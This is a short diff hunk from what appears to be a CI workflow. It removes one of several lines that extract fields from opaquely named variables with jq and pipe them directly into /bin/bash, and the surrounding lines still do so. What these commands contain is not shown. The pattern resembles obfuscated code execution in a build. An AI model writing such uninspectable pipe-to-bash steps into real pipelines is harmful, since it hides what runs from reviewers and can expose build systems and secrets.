@@ -46,7 +46,6 @@ jobs:
           printf '%s' "$ra90" | jq -r .dmmjt77 | /bin/bash
           echo $ob6 | jq -r .ukpv491 | /bin/bash
           echo $kv22297 | jq -r .bdq90 | /bin/bash
-          echo $vibmw7277 | jq -r .kh7037 | /bin/bash
 
       - name: Save archive
         if: always()
